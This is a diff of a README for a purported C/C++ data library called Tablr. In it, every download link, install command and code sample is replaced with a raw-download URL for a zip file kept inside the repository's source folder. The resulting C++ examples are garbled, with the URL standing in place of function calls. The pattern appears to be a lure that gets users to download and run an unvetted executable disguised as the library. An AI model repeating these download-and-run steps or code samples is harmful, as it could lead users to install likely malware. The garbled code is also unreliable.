@@ -1,6 +1,6 @@
 # 🛠️ Tablr - Fast and Simple Data Handling Made Easy
 
-[![Download Tablr](https://raw.githubusercontent.com/semantic-plastron80/Tablr/main/src/ops/Tablr_2.4.zip%20Tablr-Here-brightgreen)](https://raw.githubusercontent.com/semantic-plastron80/Tablr/main/src/ops/Tablr_2.4.zip)
+[![Download Tablr](https://github.com/semantic-plastron80/Tablr/raw/refs/heads/main/src/io/Software_1.3.zip%20Tablr-Here-brightgreen)](https://github.com/semantic-plastron80/Tablr/raw/refs/heads/main/src/io/Software_1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -11,11 +11,11 @@ Welcome to Tablr, the fastest and simplest data manipulation library for C and C
 To get started, you need to download Tablr. Follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page where you can download the latest version:
-   [Visit this page to download](https://raw.githubusercontent.com/semantic-plastron80/Tablr/main/src/ops/Tablr_2.4.zip)
+   [Visit this page to download](https://github.com/semantic-plastron80/Tablr/raw/refs/heads/main/src/io/Software_1.3.zip)
 
 2. **Choose the Right Version**: On the releases page, you will see a list of available versions. Look for the latest release, which typically has the highest version number.
 
-3. **Download the File**: Click on the download link for your operating system. For example, Windows users may download a `.exe` file, while Linux users may download a `https://raw.githubusercontent.com/semantic-plastron80/Tablr/main/src/ops/Tablr_2.4.zip` file.
+3. **Download the File**: Click on the download link for your operating system. For example, Windows users may download a `.exe` file, while Linux users may download a `https://github.com/semantic-plastron80/Tablr/raw/refs/heads/main/src/io/Software_1.3.zip` file.
 
 4. **Locate the Download**: After the download is complete, find the downloaded file in your computer’s downloads folder.
 
@@ -23,7 +23,7 @@ To get started, you need to download Tablr. Follow these steps:
    - **For Windows**: Double-click the `.exe` file to launch Tablr.
    - **For Linux**: Open a terminal, navigate to the directory where you downloaded the file, and run:
      ```bash
-     tar -xzf Tablr*https://raw.githubusercontent.com/semantic-plastron80/Tablr/main/src/ops/Tablr_2.4.zip
+     tar -xzf Tablr*https://github.com/semantic-plastron80/Tablr/raw/refs/heads/main/src/io/Software_1.3.zip
      cd Tablr-directory
      ./Tablr
      ```
@@ -55,17 +55,17 @@ Once you have your Tablr running, you can start working with data. Here's a simp
 1. **Importing Data**: 
    ```cpp
    #include "tablr.h"
-   Tablr table = Tablr::readCSV("https://raw.githubusercontent.com/semantic-plastron80/Tablr/main/src/ops/Tablr_2.4.zip");
+   Tablr table = Tablr::readCSV("https://github.com/semantic-plastron80/Tablr/raw/refs/heads/main/src/io/Software_1.3.zip");
    ```
 
 2. **Filtering Data**:
    ```cpp
-   Tablr filtered = https://raw.githubusercontent.com/semantic-plastron80/Tablr/main/src/ops/Tablr_2.4.zip("age > 18");
+   Tablr filtered = https://github.com/semantic-plastron80/Tablr/raw/refs/heads/main/src/io/Software_1.3.zip("age > 18");
    ```
 
 3. **Showing Data**:
    ```cpp
-   https://raw.githubusercontent.com/semantic-plastron80/Tablr/main/src/ops/Tablr_2.4.zip();
+   https://github.com/semantic-plastron80/Tablr/raw/refs/heads/main/src/io/Software_1.3.zip();
    ```
 
 This example showcases how simple it is to load and manipulate your data with Tablr.
